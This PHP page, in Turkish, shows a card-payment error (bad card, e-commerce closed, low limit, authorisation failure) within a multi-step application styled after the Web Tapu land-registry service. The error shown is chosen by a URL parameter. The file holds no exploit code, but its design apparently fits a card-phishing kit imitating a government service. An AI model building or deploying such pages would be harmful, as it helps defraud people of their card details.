<?php
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }
$aktif_adim = 3;

$hata_kodu = $_GET['hata'] ?? 'kart_hatali';
$mesajlar = [
  'kart_hatali'           => ['Kart Bilgileri Hatalı',          'Girdiğiniz kart bilgileri doğrulanamadı. Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.'],
  'eticaret_kapali'       => ['E-Ticarete Kapalı',              'Kartınız e-ticaret işlemlerine kapalıdır. Bankanızı arayarak e-ticaret limitinizi açtırınız.'],
  'limit_yetersiz'        => ['Kart Limiti Yetersiz',           'Kartınızda yeterli limit bulunmamaktadır. Limiti yeterli başka bir kartla tekrar deneyiniz.'],
  'kart_desteklenmiyor'   => ['Kart Desteklenmiyor',            'Kullandığınız kart türü bu işlem için desteklenmemektedir. Lütfen farklı bir kart deneyiniz.'],
  'provizyon_gonder'      => ['Provizyon Hatası',               'İşleminiz sırasında bir hata oluştu. Lütfen tekrar deneyiniz.'],
  'provizyon_hatali'      => ['Provizyon Onaylanamadı',         'Ödeme provizyon aşamasında hata oluştu. Bankanız işlemi onaylamadı.'],
];
[$baslik, $aciklama] = $mesajlar[$hata_kodu] ?? ['İşlem Hatası', 'Bir hata oluştu. Lütfen tekrar deneyiniz.'];

require_once __DIR__ . '/includes/header.php';
?>
        <section class="webtapu-card">
          <div class="tapu-error-box" style="margin-bottom:24px">
            <div class="tapu-error-icon">
              <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
                <circle cx="12" cy="12" r="12" fill="#c0392b"/>
                <rect x="6" y="11" width="12" height="2" rx="1" fill="white"/>
              </svg>
            </div>
            <div class="tapu-error-content">
              <p class="tapu-error-title"><?= htmlspecialchars($baslik) ?></p>
              <ul class="tapu-error-list"><li><?= htmlspecialchars($aciklama) ?></li></ul>
            </div>
          </div>

          <div class="webtapu-actions webtapu-actions--column">
            <a href="<?= BASE_PATH ?>/odeme.php" class="primaryButton" style="text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px;border-radius:8px">
              Tekrar Dene
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
            </a>
            <a href="<?= BASE_PATH ?>/" class="secondaryButton" style="text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
              Ana Sayfaya Dön
            </a>
          </div>
        </section>
<?php require_once __DIR__ . '/includes/footer.php'; ?>
